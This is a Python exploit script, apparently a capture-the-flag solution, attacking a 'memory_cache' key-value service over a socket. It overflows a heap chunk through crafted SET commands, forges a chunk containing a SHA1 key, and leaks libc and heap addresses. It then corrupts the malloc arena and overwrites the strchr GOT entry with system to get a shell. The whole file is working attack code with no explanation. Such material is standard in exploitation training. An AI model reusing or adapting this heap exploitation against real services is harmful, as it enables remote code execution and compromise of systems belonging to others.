#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
import hashlib

bin_file = './memory_cache'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'target.com', 'port':4296})
env.select()

#==========

binf = ELF(bin_file)
addr_got_strchr       = binf.got['strchr']

libc = binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn):
    mc = MemCache(conn)

    conn.recvuntil('...')
    mc.set('a', 0x20, 'a'*4)
    mc.set('b', 0x20, 'b'*4)

    mc.set('a', 0x30, 'A'*4)
    mc.set('c'*0x20, 0x20, 'c'*4)
    mc.set('d'*0x20, 0x20, 'd'*4)
    mc.set('b', 0x29, 'B'*0x28 + '\xf1')

    sha1 = hashlib.sha1()
    sha1.update('c'*0x20)

    exploit  = 'A'*0x38
    exploit += p64(0x41)
    exploit += sha1.digest() + '\x00'*0x4
    exploit += p64(0x50)
    exploit += '\x10'
    mc.set('a', 0x80, exploit)

    leak = mc.get('c'*0x20)
    addr_libc_mainarena = u64(leak[0:8]) - 0x68
    libc.address        = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc   = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']

    addr_heap_base  = u64(leak[0x40:0x48]) - 0x110
    info('addr_heap   = 0x{:08x}'.format(addr_heap_base))

    mc.get('hoge')
    mc.set('c'*0x20, 0x8, p64(0x60))

    exploit  = 'A'*0x38
    exploit += p64(0x41)
    exploit += sha1.digest() + '\x00'*0x4
    exploit += p64(0x50)
    exploit += p64(addr_libc_mainarena + 0x10)
    mc.set('a', 0x80, exploit)
    mc.set('e', 0x10, 'e'*4)

    exploit  = p64(addr_heap_base + 0x1f0)
    exploit += p64(0) * 8
    exploit += p64(((addr_got_strchr & ~0xf) - 0x10) - 0x10)
    mc.set('c'*0x20, 0x50, exploit)
    mc.set('d'*0x20, 0x30, p64(0)*3 + p64(addr_libc_system))

    conn.send("/bin/sh")

class MemCache:
    def __init__(self, conn):
        self.recvuntil  = conn.recvuntil
        self.recv       = conn.recv
        self.sendline   = conn.sendline
        self.send       = conn.send

    def set(self, key, size, data):
        self.send('SET {}'.format(key, ))
        sleep(0.005)
        self.send(str(size))
        sleep(0.005)
        self.send(data)
        self.recvuntil('OK\n')

    def get(self, key):
        self.send('GET {}'.format(key, ))
        n = int(self.recvuntil(', ', drop = True))
        return self.recv(n)

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
